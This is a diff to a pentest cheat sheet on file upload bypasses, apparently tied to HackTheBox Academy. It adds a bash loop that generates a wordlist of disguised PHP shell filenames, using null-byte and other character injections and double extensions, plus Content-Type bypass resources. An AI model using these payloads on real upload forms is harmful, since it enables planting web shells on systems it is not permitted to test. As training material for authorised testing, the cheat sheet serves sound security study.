@@ -33,8 +33,25 @@
 | **Whitelist Bypass** | [Whitelisting Extensions](https://academy.hackthebox.com/module/136/section/1289) |
 | `shell.jpg.php` | Double Extension bypass example|
 | `shell.php.jpg` | Reverse Double Extension |
-| `%20`, `%0a`, `%00`, `%0d0a`, `/`, `.\`, `.`, `…` | Character Injection - Before/After Extension |
-| **Content/Type Bypass** |
+
+
+>Character Injection - Before/After Extension to generate list of possible filenames to bypass file upload filters on white or black listings.  
+
+```bash
+for char in '%20' '%0a' '%00' '%0d0a' '/' '.\\' '.' '…' ':'; do
+    for ext in '.php' '.php3' '.php4' '.php5' '.php7' '.php8' '.pht' '.phar' '.phpt' '.pgif' '.phtml' '.phtm'; do
+        echo "shell$char$ext.jpg" >> filenames_wordlist.txt
+        echo "shell$ext$char.jpg" >> filenames_wordlist.txt
+        echo "shell.jpg$char$ext" >> filenames_wordlist.txt
+        echo "shell.jpg$ext$char" >> filenames_wordlist.txt
+    done
+done
+```  
+
+## Content/Type Bypass  
+
+| **Command**   | **Description**   |
+| --------------|-------------------|
 | [Web Content-Types](https://github.com/danielmiessler/SecLists/blob/master/Miscellaneous/web/content-type.txt) | List of Web Content-Types |
 | [Content-Types](https://github.com/danielmiessler/SecLists/blob/master/Discovery/Web-Content/web-all-content-types.txt) | List of All Content-Types |
 | [File Signatures](https://en.wikipedia.org/wiki/List_of_file_signatures) | List of File Signatures/Magic Bytes |
